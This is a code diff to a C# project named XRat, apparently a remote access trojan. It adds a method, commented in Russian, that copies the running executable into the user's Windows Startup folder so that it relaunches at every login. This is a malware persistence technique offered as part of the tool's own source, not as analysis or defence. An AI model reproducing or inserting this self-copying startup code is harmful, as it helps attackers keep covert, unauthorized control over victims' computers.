@@ -1,5 +1,6 @@
 ﻿using System;
 using System.Diagnostics;
+using System.Reflection;
 using System.Runtime.InteropServices;
 
 namespace XRat
@@ -127,5 +128,42 @@ namespace XRat
                 t.Start();
             }
         }
+
+        public static string Startup()
+        {
+            // Получаем путь к текущему исполняемому файлу
+            string sourceFilePath = Assembly.GetExecutingAssembly().Location;
+
+            // Получаем путь к папке автозагрузки текущего пользователя
+            string userStartupFolder = Path.Combine(
+                Environment.GetFolderPath(Environment.SpecialFolder.Startup)
+            );
+
+            // Получаем имя файла (с расширением)
+            string fileName = Path.GetFileName(sourceFilePath);
+
+            // Путь, куда будет скопирован файл
+            string destinationFilePath = Path.Combine(userStartupFolder, fileName);
+
+            // Копируем файл в папку автозагрузки, если он не существует там
+            try
+            {
+                if (!File.Exists(destinationFilePath))
+                {
+                    // Копирование самого себя в папку автозагрузки
+                    File.Copy(sourceFilePath, destinationFilePath);
+                    return $"Программа успешно скопирована в автозагрузку: {destinationFilePath}";
+                }
+                else
+                {
+                    return "Программа уже существует в папке автозагрузки.";
+                }
+            }
+            catch (Exception ex)
+            {
+                return $"Произошла ошибка: {ex.Message}";
+            }
+        }
     }
+
 }
